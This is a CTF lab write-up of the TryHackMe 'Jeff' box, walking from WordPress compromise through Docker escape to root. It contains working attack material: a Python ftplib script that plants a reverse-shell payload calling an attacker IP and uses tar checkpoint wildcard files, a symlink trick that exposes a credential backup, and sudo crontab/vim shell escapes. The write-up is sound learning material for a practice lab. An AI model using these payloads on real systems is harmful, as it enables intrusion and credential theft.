## Intro

Namaste everyone. Welcome back! this time it is the writeup of jeff box. To be honest it was really difficult for me. But at the end i solved it. Its going to be a long read.

So some info about the box before we begin. We exploit the wordpress site and find that its inside a docker container and you need to escape out of it. Once you escape you need to find a way to get jeff's password which you don't have permission to access. Once you are jeff you can get user flag and privilege escalation is really easy !

## Scanning and Enumeration

```console
Nmap scan report for 10.10.189.32
Host is up (0.44s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The box has ssh and http open. For the most of time we will be dealing with the http server

## - Port 80

Looking at the site its an blank page. Viewing the source we find that we need to put `jeff.thm` into our `/etc/hosts`

Let's visit `jeff.thm` now

<a href="/assets/img/thm/jeff/jeffhome.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/jeffhome.png"></a>

Browsing at the site we don't find anything interesting. So i fired out gobuster to see if there are hidden directories

```bash
gobuster dir -u jeff.thm -w /usr/share/wordlists/dirb/common.txt
```
<a href="/assets/img/thm/jeff/gobust.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/gobust.png"></a>

Looking at the scan instantly `backups` caught my attention. I may look into `uploads` later on. inside `backups` it must contain a backup of something right? 
So i went to `[http://jeff.thm/backups/backup.zip](http://jeff.thm/backups/backup.zip)` to try my luck and luckily there was a zip file and it started downloading.

<a href="/assets/img/thm/jeff/backups.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/backups.png"></a>

Let's unzip it and see what it contains

<a href="/assets/img/thm/jeff/backupspassword.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/backupspassword.png"></a>

Oops! It's password protected. So in this phase i had no option but only to bruteforce it.

For bruteforcing i used a tool `fcrackzip`. You can easily install by running `apt install fcrackzip`

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

`D` : Run a dictionary attack

`-p` : password list

Use `-v` to verbose output

Within a few seconds it found the password

```console
possible pw found: [REDACTED]
```

Let's unzip and see the contents inside

```bash
unzip backup.zip
```

```console
root@kali:~/Desktop/tryhackme/jeff/backup# ls -la
total 20
drwxrwx--- 3 root root 4096 Sep 26 05:14 .
drwxr-xr-x 4 root root 4096 Sep 26 02:41 ..
drwxrwx--- 2 root root 4096 Sep 26 05:14 assets
-rwxrwx--- 1 root root 1178 May 14 11:20 index.html
-rwxrwx--- 1 root root   41 May 14 11:20 wpadmin.bak
```

Looking inside we can say it's the backup of wordpress website and  `wpadmin.bak` should contain a creds for the login.

```console
wordpress password is: [REDACTED] 
```

But wait a moment we didn't find any wordpress running at the `jeff.thm` and inside it's directories but the developer said that he was building a wordpress site and he will be upgrading in the future so there must be a subdomain where he might have hosted wordpress.

We can also find the subdomains of the site from `gobuster`

```bash
gobuster vhost -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

And it did found a subdomain where wordpress is hosted

```console
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
```

<a href="/assets/img/thm/jeff/wp.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/wp.png"></a>

We know the password from the `[backup.zip](http://backup.zip)` and looking at the site `jeff` maybe the username. Let's login going to `http://wordpress.jeff.thm/wp-admin`

## Exploitation

<a href="/assets/img/thm/jeff/wp_dashboard.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/wp_dashboard.png"></a>

Let's get a reverse shell so we can go deep inside the box. There are multiple ways to get reverse shell but this time i am going to get it from using malicious plugin. I did the injecting malicious code in themes in [internal writeup](https://theprashil.github.io/ctf/thm-internal). So i wanted to try something new

You can get the malicious code from the github link

We need to zip it and install in order to work.

```bash
zip final.zip ./revshell.php
```

And upload it to the `Plugins > Add New > Upload Plugin >` and install it.

Fire up a listener in you attacker box and activate the plugin to get reverse shell

<a href="/assets/img/thm/jeff/reverseshell.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/reverseshell.png"></a>

Looking inside we are in a docker container which has it's own system. So we are limited. At this point i was searching for a way to escape this container and enumerated further. I found a interesting file inside the /var/www/html named ftp_backup.php

```console
www-data@Jeff:/var/www/html$ ls
ls
ftp_backup.php
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```
Looking inside that script...

```php
<?php
/* 
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "[REDACTED]";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
```

**My thoughts when i looked  the script:**

- It is somehow looking like a script to upload files to ftp
- It has a host but it is internal access only
- The script isn't complete yet

So at this moment i struggled as well. I was learning as well and it felt like it was out of my league. I knew i was in a docker container and i had to escape it. Finding this script i knew i had a ftp login creds which i can use but didn't **know how can i exploit ?**

I took some help and research about **[wildcard exploitation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)** 

**After looking how can i automate this, found that in container `python3.7` is installed which is going to be helpful for us**

**I will try my best to explain it to you**

I curl to the host we are given with the creds and list what's inside using this

```bash
curl -v -s -P- 'ftp://backupmgr:[REDACTED]@172.20.0.1/'
```

`-v` verbose output

`-s` silent mode

`-P` we need to have p

```console
* Connection #0 to host 172.20.0.1 left intact
drwxr-xr-x    2 1001     1001         4096 May 18 16:14 files
www-data@Jeff:/var/www/html$
```
Okay! there's a `files` directory 

**So here's what i am gonna do**

- Create a python script to upload a reverse shell to that `files` so that when the connection is established we can escape the container

**But how?**

- When our exploit is at the ftp it gets executed using **TAR Wildcard Exploitation**

Here's the python script i will explain it as well

```python
#!/usr/bin/env python3.7

from ftplib import FTP
import io

#Connecting to the host
ftp = FTP(host= '172.20.0.1')

#login for ftp user
ftp.login(user= "backupmgr", passwd= "[REDACTED]")
ftp.getwelcome()

ftp.set_pasv(False)
ftp.dir()
ftp.cwd('/files')

payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.140",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
empty = io.BytesIO(b'')

ftp.storlines('STOR exploit.sh', payload)
ftp.storlines('STOR --checkpoint=1', empty)
ftp.storlines('STOR --checkpoint-action=exec=sh exploit.sh', empty)

ftp.quit()
```

### **Explanation**

- From the `ftplib` we are going to import `FTP` module which is required for ftp connection
- We then provide the `host` , `username` and the `password` for the ftp server.

We set it to active mode because the passive mode won't work out

```python
#In the active mode -  the data connection is incoming to the FTP client and outgoing from the FTP server
# In the passive mode - the data connection is incomting to the FTP server and outfgoing from the FTP client
ftp.set_pasv(False) #sets it to the active mode
```

- Then we are going to change our directory to `/files`

There are two common modes for transferring files via FTP, `ascii` and `binary`
Ascii mode transfers files as 'text'. Examples of ascii files would be .txt, .asp, .html, and .php files
Binary mode transfers files as raw data. Examples of binary files would be .wav, .jpg, .gif, and mp3 files

So we are using ascii mode to transfer files

- We create two files one `payload`  which contains our reverse shell and another `empty`

`ftp.storlines()`: Store a file in ASCII transfer mode.

```python
ftp.storlines('STOR shell.sh',payload)
ftp.storlines('STOR --checkpoint=1',empty)
ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh',empty)
```

So here we are using **TAR wildcard exploitation** to make it work. Outside the container there's a crontab to backup everything inside there every min so it is how the above code gets executed and we get a reverse shell. 

`ftp.quit()` just exits the connection. 

Ready? Let's upload to the container by creating a server and run it

<a href="/assets/img/thm/jeff/exploit.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/exploit.png"></a>

Make the file executable

```bash
chmod +x exploit.py
```

and run it. In your attacker machine open a listener at `1234` and in a min the cronjob will execute our shell.

<a href="/assets/img/thm/jeff/pivot.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/pivot.png"></a>

let's get a fully interactive tty shell using python and when we list the current directory

```console
backupmgr@tryharder:~/.ftp/files$ ls -la
total 12
drwxr-xr-x 2 backupmgr backupmgr 4096 Sep 26 11:15  .
drwxr-xr-x 3 nobody    nogroup   4096 May 11 01:32  ..
-rwxr-xr-x 1 backupmgr backupmgr    0 Sep 26 11:15 '--checkpoint=1'
-rwxr-xr-x 1 backupmgr backupmgr    0 Sep 26 11:15 '--checkpoint-action=exec=sh exploit.sh'
-rwxr-xr-x 1 backupmgr backupmgr  228 Sep 26 11:15  exploit.sh
```

That's how the cronjob exploit happened , it reached to the `checkpoint 1` and it instructed to execute a shell `exploit.sh` which contains our payload to give reverse shell. Hope you understood it. It took me a lot of time to understand.

Now we got outside the container we can easily move ahead. We are the user `backupmgr` and we can't access the user `jeff`

```console
backupmgr@tryharder:~/.ftp/files$ cd /home
backupmgr@tryharder:/home$ ls -la
total 16
drwxr-xr-x  4 root      root      4096 May 10 22:28 .
drwxr-xr-x 25 root      root      4096 May 23 14:40 ..
drwxr-xr-x  7 backupmgr backupmgr 4096 May 24 13:25 backupmgr
drwx------  5 jeff      jeff      4096 May 18 16:09 jeff
backupmgr@tryharder:/home$
```

So to escalate our privilege let's see what are the files owned by `jeff`

```bash
find / -user jeff 2>/dev/null

```

hmm...

```console
backupmgr@tryharder:/home$ find / -user jeff 2>/dev/null
/opt/systools
/opt/systools/systool
/home/jeff
/var/backups/jeff.bak
backupmgr@tryharder:/home$
```

`/var/backups/jeff.bak` contains the creds of `jeff` which we can't access right now..

`/opt/systools/systool` seems interesting

```console
backupmgr@tryharder:/opt/systools$ file systool 
systool: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b3c82d2e7f7a8238bc85dabfef348c6ca50557, for GNU/Linux 3.2.0, not stripped
backupmgr@tryharder:/opt/systools$ ls -la
total 32
drwxrwxrwx 2 jeff jeff   4096 May 24 15:08 .
drwxr-xr-x 4 root root   4096 May 24 13:13 ..
-rwxrwxrwx 1 root root    108 May 24 13:19 message.txt
-rwxr-sr-x 1 jeff pwman 17160 May 24 13:18 systool
backupmgr@tryharder:/opt/systools$
```

Looking at the files `systool` we can execute it. Before that let's see what is inside the `message.txt`

```console
backupmgr@tryharder:/opt/systools$ cat message.txt 
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
backupmgr@tryharder:/opt/systools$
```

Let's run `systool`

```console
backupmgr@tryharder:/opt/systools$ ./systool 
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2

Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.

1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 3
backupmgr@tryharder:/opt/systools$
```

Okay what we can see is option 2 reads the file from `message.txt`

So how can we exploit it to give us password of jeff?

We can delete the message.txt and link the `/opt/backups/jeff.bak` to `message.txt` and when the tool runs it tries to read the file from `jeff.bak`and displays whats inside .

Let's try out

```console
backupmgr@tryharder:/opt/systools$ rm message.txt 
backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ls -la
total 28
drwxrwxrwx 2 jeff      jeff       4096 Sep 26 11:34 .
drwxr-xr-x 4 root      root       4096 May 24 13:13 ..
lrwxrwxrwx 1 backupmgr backupmgr    21 Sep 26 11:34 message.txt -> /var/backups/jeff.bak
-rwxr-sr-x 1 jeff      pwman     17160 May 24 13:18 systool
backupmgr@tryharder:/opt/systools$
```

```console
backupmgr@tryharder:/opt/systools$ ./systool

There you go.. 

We know `ssh`  is open . Let's ssh into `jeff@jeff.thm` with the above creds

Listing out the files there's `user.flag` which is our first flag. Also you need to md5 the inside content to upload it. i will leave this to you

## Privilege Escalation

It's really easy to escalate to root.

But the issue is `jeff` is running on a restricted shell so we need to escape out of it

The one i used is

`ssh jeff@jeff.thm -t "bash --noprofile"`

What it does is it starts the remote shell without loading “rc” profile ( where most of the limitations are often configured) 

When you type `sudo -l`

```console
jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
jeff@tryharder:~$
```

Easy right ?

so i ran `sudo /usr/bin/crontab -e`

which opened `vim` and for getting shell you just need to type `:!/bin/sh`

<a href="/assets/img/thm/jeff/vim.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/vim.png"></a>

Great now you are now `root`

<a href="/assets/img/thm/jeff/root.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/jeff/root.png"></a>

and the final flag is in the `/root` 

## Conclusion

That's it folks! If you read whole writeup i hope it didn't bore you. i tried to explain in deep as much as possible. There was a complete learning for me as well. It was worth the time to solve this challenge and learn new things. Okay so I will see you again in next writeup.
